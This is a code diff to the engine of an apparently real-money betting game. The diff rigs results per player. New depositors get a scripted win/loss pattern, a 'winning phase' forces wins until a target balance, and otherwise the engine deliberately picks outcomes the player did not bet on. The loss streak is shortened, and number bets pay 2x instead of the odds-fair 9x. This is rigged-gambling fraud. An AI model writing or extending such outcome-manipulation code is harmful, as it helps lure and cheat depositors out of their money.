@@ -79,7 +79,7 @@ export function GameEngine() {
     let winningNumber: number;
     const userBetsInRound = user ? betsToProcess.filter(bet => bet.userId === user.uid) : [];
     const userHasBet = userBetsInRound.length > 0;
-    const randomLossStreak = Math.floor(Math.random() * 5) + 5; // 5 to 10
+    const randomLossStreak = Math.floor(Math.random() * 3) + 2; // 2 to 4 losses before a win in losing phase
 
     const getUserWinningNumbers = (): number[] => {
         const winningNumbers: number[] = [];
@@ -107,8 +107,12 @@ export function GameEngine() {
 
     if (currentUserData && userHasBet) {
         let forceWin = false;
-
-        if (currentUserData.inWinningPhase) {
+        let winPatterns = [true, true, false, false, true, false, false]; // Win, Win, Loss, Loss, Win, Loss, Loss
+        
+        // Use depositCount for initial pattern, then switch to betsSinceLastWin
+        if(currentUserData.depositCount === 1 && (currentUserData.betsSinceLastWin < winPatterns.length)) {
+             forceWin = winPatterns[currentUserData.betsSinceLastWin];
+        } else if (currentUserData.inWinningPhase) {
             if(currentUserData.balance < currentUserData.targetBalance) {
                 forceWin = Math.random() < 0.8; // 80% chance to win
             } else {
@@ -137,6 +141,7 @@ export function GameEngine() {
             if (losingOptions.length > 0) {
                 winningNumber = losingOptions[Math.floor(Math.random() * losingOptions.length)];
             } else {
+                // If user has bet on all numbers, pick a random one (still a loss for them if they bet on color/size)
                 winningNumber = Math.floor(Math.random() * 10);
             }
         }
@@ -151,7 +156,7 @@ export function GameEngine() {
                 const winningSize = getWinningSize(i);
                 let multiplier = 0;
 
-                if (bet.type === 'number' && bet.target === i) multiplier = 2; // Changed from 9 to 2
+                if (bet.type === 'number' && bet.target === i) multiplier = 2; 
                 else if (bet.type === 'color' && bet.target === winningColor) multiplier = 2;
                 else if (bet.type === 'size' && bet.target === winningSize) multiplier = 2;
                 
@@ -206,7 +211,7 @@ export function GameEngine() {
             let payout = 0;
             let multiplier = 0;
     
-            if (bet.type === 'number' && bet.target === resultData.winningNumber) multiplier = 2; // Changed from 9 to 2
+            if (bet.type === 'number' && bet.target === resultData.winningNumber) multiplier = 2;
             else if (bet.type === 'color' && bet.target === resultData.winningColor) multiplier = 2;
             else if (bet.type === 'size' && bet.target === resultData.winningSize) multiplier = 2;
 
@@ -243,7 +248,7 @@ export function GameEngine() {
             if (currentUserData.inWinningPhase && currentUserData.balance + (userPayouts[user.uid] || 0) >= currentUserData.targetBalance) {
                 userDataUpdate.inWinningPhase = false;
                 userDataUpdate.betsSinceLastWin = 0;
-            } else if (!currentUserData.inWinningPhase) {
+            } else {
                 if (userWinLoss[user.uid] === 'win') {
                     userDataUpdate.betsSinceLastWin = 0;
                 } else {
